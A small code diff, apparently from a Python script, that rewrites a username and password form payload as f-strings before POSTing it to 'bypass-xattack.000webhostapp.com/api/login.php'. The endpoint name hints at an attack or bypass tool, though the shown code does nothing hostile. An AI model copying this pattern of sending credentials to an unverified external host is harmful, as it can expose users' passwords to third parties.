@@ -16,8 +16,8 @@ headers = {
 }
 
 data = {
-  "username":username,
-  "password":password
+  "username":f"{username}",
+  "password":f"{password}"
 }
 
 name = requests.post("http://bypass-xattack.000webhostapp.com/api/login.php",data=data, headers=headers)
